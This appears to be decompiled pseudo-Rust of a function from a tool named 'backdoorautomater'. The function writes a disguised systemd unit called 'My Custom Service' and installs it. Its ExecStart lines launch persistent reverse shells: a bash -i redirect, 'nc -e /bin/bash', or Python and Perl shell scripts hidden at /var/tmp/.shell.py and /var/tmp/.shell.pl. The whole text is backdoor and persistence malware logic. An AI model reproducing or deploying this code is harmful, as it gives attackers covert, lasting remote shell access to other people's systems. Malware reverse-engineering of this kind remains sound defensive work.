
  fn backdoorautomater::newservice::write_service::hf90b4724373f44a5(arg1: *mut i64, arg2: *mut i64, arg3: *mut i64, arg4: i8) -> *mut *mut [i8; 0x94]

{
    let mut rax: i64;
    rax = 1;
    let var_50: i64 = rax;
    let mut r13: i64;
    r13 = 1;
    let mut var_48: i128;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_48, 
        arg2);
    r13 = 1;
    
    if _$LT$$RF$str$u20$as$u20$core..str..pattern..Pattern$GT$::is_contained_in::h36f93e99507e9f19(
        arg1[1], arg1[2]) == 0
    {
        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(arg1, 
            ".service[^0-9/]+Error!: /.bashrc…", 8);
    }
    
    let rax_3: u64 = arg4 - 1;
    
    if rax_3 > 3
    {
        goto 'label_4580c7;
    }
    
    let mut var_b8: i128;
    let var_a8: u64;
    let mut var_98: i128;
    let mut var_78: i128;
    let mut var_68: i64;
    let mut rbp: i8;
    let mut result: *mut *mut [i8; 0x94];
    
    match rax_3
    {
        0 =>
        {
            var_78 = "ExecStart=nc [Unit]\nDescription…";
            *var_78[8] = 0xd;
            var_68 = *arg3.byte_offset(8);
            r13 = 1;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_b8, &var_78, 2, 1, 0);
            var_98 = var_b8;
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_98, 
                "  -e /bin/bash\n/ 0>&1'\nExecSta…", 1);
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_98, arg2[1], 
                arg2[2]);
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_98, 
                " -e /bin/bash\n/ 0>&1'\nExecStar…", 0xe);
            std::fs::File::create::he97042899d0016f9(&var_78, arg1);
            
            if var_78 != 0
            {
                result = *var_78[8];
                'label_457f40:
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
                'label_45806d:
                r13 = 1;
                rbp = 0;
                'label_458077:
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_48);
                
                if rbp == 0
                {
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
                    let mut r15: *mut i64;
                    r15 = 1;
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
                }
                
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
                return result;
            }
            
            var_b8 = *var_78[4];
            let result_21: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "[Unit]\nDescription=My Custom Se…", 7);
            result = result_21;
            
            if result_21 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457f40;
            }
            
            let result_22: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "Description=My Custom Service\nA…", 0x1e);
            result = result_22;
            
            if result_22 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457f40;
            }
            
            let result_23: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "After=network-online.target\n\n[…", 0x1d);
            result = result_23;
            
            if result_23 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457f40;
            }
            
            let result_24: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "[Service]\nExecStartPre=/bin/sle…", 0xa);
            result = result_24;
            
            if result_24 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457f40;
            }
            
            let result_25: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "ExecStartPre=/bin/sleep 15\nType…", 0x1b);
            result = result_25;
            
            if result_25 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457f40;
            }
            
            let result_26: *mut *mut [i8; 0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, *var_98[8], var_a8);
            result = result_26;
            
            if result_26 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457f40;
            }
            
            let result_27: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "Type=simple\n\n[Install]\nWanted…", 0xd);
            result = result_27;
            
            if result_27 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457f40;
            }
            
            let result_28: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "[Install]\nWantedBy=default.targ…", 0xa);
            result = result_28;
            
            if result_28 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457f40;
            }
            
            let result_29: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "WantedBy=default.target\nExecSta…", 0x18);
            result = result_29;
            
            if result_29 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457f40;
            }
            
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
            'label_4580c7:
            r13 = 1;
            rbp = 0;
        }
        1 =>
        {
            var_78 = "ExecStart=/bin/bash -c 'bash -i …";
            *var_78[8] = 0x2c;
            var_68 = *arg3.byte_offset(8);
            r13 = 1;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_b8, &var_78, 2, 1, 0);
            var_98 = var_b8;
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_98, 
                "/ 0>&1'\nExecStart=nc [Unit]\nDe…", 1);
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_98, arg2[1], 
                arg2[2]);
            alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_98, 
                " 0>&1'\nExecStart=nc [Unit]\nDes…", 7);
            std::fs::File::create::he97042899d0016f9(&var_78, arg1);
            
            if var_78 == 0
            {
                var_b8 = *var_78[4];
                let result_30: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                    &var_b8, "[Unit]\nDescription=My Custom Se…", 7);
                result = result_30;
                
                if result_30 == 0
                {
                    let result_31: *mut *mut [i8; 0x94] =
                        std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                        "Description=My Custom Service\nA…", 0x1e);
                    result = result_31;
                    
                    if result_31 == 0
                    {
                        let result_32: *mut *mut [i8; 0x94] =
                            std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                            "After=network-online.target\n\n[…", 0x1d);
                        result = result_32;
                        
                        if result_32 == 0
                        {
                            let result_33: *mut *mut [i8; 0x94] =
                                std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                                "[Service]\nExecStartPre=/bin/sle…", 0xa);
                            result = result_33;
                            
                            if result_33 == 0
                            {
                                let result_34: *mut *mut [i8; 0x94] =
                                    std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                                    "ExecStartPre=/bin/sleep 15\nType…", 0x1b);
                                result = result_34;
                                
                                if result_34 == 0
                                {
                                    let result_35: *mut *mut [i8; 0x94] =
                                        std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                                        *var_98[8], var_a8);
                                    result = result_35;
                                    
                                    if result_35 == 0
                                    {
                                        let result_36: *mut *mut [i8; 0x94] =
                                            std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, 
                                            "Type=simple\n\n[Install]\nWanted…", 0xd);
                                        result = result_36;
                                        
                                        if result_36 == 0
                                        {
                                            let result_37: *mut *mut [i8; 0x94] =
                                                std::io::Write::write_all::h18f2f3ca7c9bcc20(
                                                &var_b8, "[Install]\nWantedBy=default.targ…", 0xa);
                                            result = result_37;
                                            
                                            if result_37 == 0
                                            {
                                                let result_38: *mut *mut [i8; 0x94] =
                                                    std::io::Write::write_all::h18f2f3ca7c9bcc20(
                                                    &var_b8, "WantedBy=default.target\nExecSta…", 
                                                    0x18);
                                                result = result_38;
                                                
                                                if result_38 == 0
                                                {
                                                    core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                                                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
                                                    goto 'label_4580c7;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
            }
            else
            {
                result = *var_78[8];
            }
            
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
            goto 'label_45806d;
        }
        2 =>
        {
            let rax_7: u64 = arg2[2];
            var_b8 = *arg2;
            let var_68_1: i64 = arg3[2];
            var_78 = *arg3;
            backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
                backdoorautomater::newservice::write_shell_pyfile::h388a3bef0a7e09fc(&var_b8, 
                &var_78));
            var_78 = "ExecStart=python \nExecStart=per…";
            *var_78[8] = 0x11;
            let var_68_2: *const i8 = "/var/tmp/.shell.py/var/tmp/.shel…";
            let var_60_1: i64 = 0x12;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_b8, &var_78, 2, 1, 0);
            var_98 = var_b8;
            std::fs::File::create::he97042899d0016f9(&var_78, arg1);
            
            if var_78 != 0
            {
                result = *var_78[8];
                'label_457cbf:
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
                'label_457e13:
                rbp = 1;
                goto 'label_458077;
            }
            
            var_b8 = *var_78[4];
            let result_1: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "[Unit]\nDescription=My Custom Se…", 7);
            result = result_1;
            
            if result_1 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457cbf;
            }
            
            let result_2: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "Description=My Custom Service\nA…", 0x1e);
            result = result_2;
            
            if result_2 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457cbf;
            }
            
            let result_3: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "After=network-online.target\n\n[…", 0x1d);
            result = result_3;
            
            if result_3 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457cbf;
            }
            
            let result_4: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "[Service]\nExecStartPre=/bin/sle…", 0xa);
            result = result_4;
            
            if result_4 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457cbf;
            }
            
            let result_5: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "ExecStartPre=/bin/sleep 15\nType…", 0x1b);
            result = result_5;
            
            if result_5 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457cbf;
            }
            
            let result_6: *mut *mut [i8; 0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, *var_98[8], rax_7);
            result = result_6;
            
            if result_6 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457cbf;
            }
            
            let result_7: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "\nExecStart=perl  /etc/systemd/s…", 1);
            result = result_7;
            
            if result_7 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457cbf;
            }
            
            let result_8: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "Type=simple\n\n[Install]\nWanted…", 0xd);
            result = result_8;
            
            if result_8 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457cbf;
            }
            
            let result_9: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "[Install]\nWantedBy=default.targ…", 0xa);
            result = result_9;
            
            if result_9 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457cbf;
            }
            
            let result_10: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "WantedBy=default.target\nExecSta…", 0x18);
            result = result_10;
            
            if result_10 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457cbf;
            }
            
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
            rbp = 1;
        }
        3 =>
        {
            let rax_11: u64 = arg2[2];
            var_b8 = *arg2;
            let var_68_3: i64 = arg3[2];
            var_78 = *arg3;
            backdoorautomater::sanitizer::sanitize_return_fn::hb2c462d03cd2292c(
                backdoorautomater::newservice::write_shell_perl::h8f1a23ba35eb1918(&var_b8, 
                &var_78));
            var_78 = "ExecStart=perl  /etc/systemd/sys…";
            *var_78[8] = 0xf;
            let var_68_4: *const i8 = "/var/tmp/.shell.pl  -e /bin/bash…";
            let var_60_2: i64 = 0x12;
            alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_b8, &var_78, 2, 1, 0);
            var_98 = var_b8;
            std::fs::File::create::he97042899d0016f9(&var_78, arg1);
            
            if var_78 != 0
            {
                result = *var_78[8];
                'label_457e0e:
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
                goto 'label_457e13;
            }
            
            var_b8 = *var_78[4];
            let result_11: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "[Unit]\nDescription=My Custom Se…", 7);
            result = result_11;
            
            if result_11 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457e0e;
            }
            
            let result_12: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "Description=My Custom Service\nA…", 0x1e);
            result = result_12;
            
            if result_12 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457e0e;
            }
            
            let result_13: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "After=network-online.target\n\n[…", 0x1d);
            result = result_13;
            
            if result_13 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457e0e;
            }
            
            let result_14: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "[Service]\nExecStartPre=/bin/sle…", 0xa);
            result = result_14;
            
            if result_14 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457e0e;
            }
            
            let result_15: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "ExecStartPre=/bin/sleep 15\nType…", 0x1b);
            result = result_15;
            
            if result_15 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457e0e;
            }
            
            let result_16: *mut *mut [i8; 0x94] =
                std::io::Write::write_all::h18f2f3ca7c9bcc20(&var_b8, *var_98[8], rax_11);
            result = result_16;
            
            if result_16 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457e0e;
            }
            
            let result_17: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "\nExecStart=perl  /etc/systemd/s…", 1);
            result = result_17;
            
            if result_17 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457e0e;
            }
            
            let result_18: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "Type=simple\n\n[Install]\nWanted…", 0xd);
            result = result_18;
            
            if result_18 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457e0e;
            }
            
            let result_19: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "[Install]\nWantedBy=default.targ…", 0xa);
            result = result_19;
            
            if result_19 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457e0e;
            }
            
            let result_20: *mut *mut [i8; 0x94] = std::io::Write::write_all::h18f2f3ca7c9bcc20(
                &var_b8, "WantedBy=default.target\nExecSta…", 0x18);
            result = result_20;
            
            if result_20 != 0
            {
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
                goto 'label_457e0e;
            }
            
            core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(var_b8);
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_98);
            rbp = 1;
        }
    }
    
    let var_a8_3: i64 = arg1[2];
    var_b8 = *arg1;
    let var_38: i64;
    let var_68_5: i64 = var_38;
    var_78 = var_48;
    backdoorautomater::newservice::create_service::h60e36f0974dfe8c1(&var_b8, &var_78);
    
    if rbp == 0
    {
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg3);
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    }
    
    nullptr
}
